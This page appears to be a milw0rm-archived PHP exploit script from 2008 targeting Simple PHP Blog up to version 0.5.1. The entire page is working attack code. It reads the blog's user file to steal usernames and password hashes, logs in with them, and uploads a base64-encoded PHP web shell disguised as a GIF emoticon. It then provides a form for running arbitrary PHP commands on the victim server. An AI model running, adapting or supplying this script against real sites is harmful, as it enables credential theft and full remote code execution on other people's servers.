<html><head><title>Simple PHP Blog (SPHPBlog) <= 0.5.1 Code Execution Exploit</title></head><pre>&lt;?
/*
   sIMPLE php bLOG 0.5.0 eXPLOIT
   bY mAXzA 2008
*/
function curl($url,$postvar){
  global $cook;
  $ch = curl_init( $url );
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_HEADER, 1);
  curl_setopt ($ch, CURLOPT_REFERER,&quot;$url&quot;);
  if (strlen($postvar)&lt;3) $postvar=&quot;123&quot;;
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $postvar);
  if (strlen($cook)&gt;3)
      curl_setopt ($ch, CURLOPT_COOKIE, &quot;$cook&quot;);
  $res = curl_exec ($ch);$err=curl_error ( $ch );if ($err) print &quot;&lt;hr&gt;$err&lt;hr&gt;&quot;;
  curl_close($ch);
  return $res;
}

function error($msg){
  print &quot;&lt;hr&gt;$msg&lt;hr&gt;\n&lt;h1&gt;Not Exploitable&quot;;exit;
}

extract($_POST);extract($_GET);

print &quot;&lt;pre&gt;URL:&lt;form method=post&gt;&lt;input size=80 name=url value=`$url`&gt;&quot;;
if (strlen($eval)&gt;3){
   $eval=stripslashes($eval);
   print &quot;\nEnter PHP Command:\n&lt;textarea name=eval rows=10 cols=90&gt;$eval&lt;/textarea&gt;&quot;;
   print &quot;&lt;input type=submit value='Eval'&gt;&lt;/form&gt;&quot;;
   $res=curl(&quot;$url/images/emoticons/sphp.php&quot;,&quot;z=$eval&quot;);
   $res=strstr($res,&quot;GIF89a&quot;);
   print substr($res,41);exit;
}

if (strlen($url)&gt;10)
{
  print &quot;\n&lt;hr&gt;Trying to Get /config/users.php...&quot;;flush();
  $res=curl($url.&quot;/config/users.php&quot;,&quot;&quot;);
  if (strstr($res,'|')) print &quot;Done!\n\n$res&quot;;
  else error(&quot;\n\nUsername &amp; Password Not Found\n\n$res&quot;);

  print &quot;\n&lt;hr&gt;Trying to Get Username &amp; Password...&quot;;flush();
  $res=str_replace(&quot;\r\n&quot;,&quot;\n&quot;,$res);
  $res=substr($res,strpos($res,&quot;\n\n&quot;)+2);
  $line=explode(&quot;\n&quot;,$res);$n=count($line)-1;
  if ($n) {
  print &quot;\nDone! Found - $n users:\n&quot;;
   for ($x=0;$x&lt;$n;$x++){
     $up=explode(&quot;|&quot;,$line[$x]);$user[$x]=$up[1];$pass[$x]=substr($up[2],0,2);
     print &quot;\nUsername - &quot;.$up[1].&quot;\tPassword - &quot;.$up[2];
   }
  }

  print &quot;\n&lt;hr&gt;Trying to Login...&quot;;flush();
  $postvar=&quot;user=$user[0]&amp;pass=$pass[0]&amp;&quot;;
  $res=curl($url.&quot;/login_cgi.php&quot;,&quot;$postvar&quot;);
  $cook=strstr($res,'Set-Cookie: sid=');
  $cook=substr($cook,12,strpos($cook,';')-12);
  if ($cook) print &quot;\n\nDone...  Cookie - $cook&quot;;else error(&quot;\n&lt;h1&gt;Error To Login&lt;/h1&gt;\n\n\n$res&quot;);

  print &quot;\n&lt;hr&gt;Trying to Upload Emoticon...&quot;;flush();
  $buf=&quot;R0lGODlhAQABAIAAAP///wAAACH5BAEUAAAALAAAAAABAAEAAAICRAE8PyBldmFsKHN0cmlwc2xhc2hlcygkX1BPU1Rbel0pKTtleGl0Oz8+Ow==&quot;;
  if (@filesize('sphp.php')!=82){
       $f=fopen('sphp.php',&quot;w&quot;);fwrite($f,base64_decode($buf));fclose($f);
  }
  $f=getcwd().&quot;/sphp.php&quot;;
  $res=curl($url.&quot;/emoticons.php&quot;,array('user_emot'=&gt;&quot;@$f&quot;));
  if (strstr($res,&quot;Success!&quot;)) print &quot;\n\nDone! Exploit path - $url/images/emoticons/sphp.php&quot;; else error(&quot;\n&lt;h1&gt;Error To Upload&lt;/h1&gt;\n\n\n$res&quot;);

  print &quot;\n&lt;hr&gt;Trying to Exploit...&quot;;flush();
  $res=curl($url.&quot;/images/emoticons/sphp.php&quot;,&quot;z=print 20080824;&quot;);
  if (strstr($res,&quot;20080824&quot;)) print &quot;\n\nDone! Exploit Working!&quot;; else error(&quot;\n&lt;h1&gt;Error To Exploit&lt;/h1&gt;\n\n\n$res&quot;);

  print &quot;\n&lt;hr&gt;Trying to Logout...&quot;;flush();
  $res=curl($url.&quot;/logout.php&quot;,&quot;&quot;);
  if (strstr($res,&quot;You are now logged out&quot;)) print &quot;\n\nDone!&quot;; else error(&quot;\n&lt;h1&gt;Error To Logout&lt;/h1&gt;\n\n\n$res&quot;);
  print &quot;\nEnter PHP Command:\n&lt;textarea name=eval rows=10 cols=90&gt;&lt;/textarea&gt;&quot;;
}
print &quot;&lt;input type=submit &gt;&lt;/form&gt;&quot;;
?&gt;

# milw0rm.com [2008-08-26]</pre></html>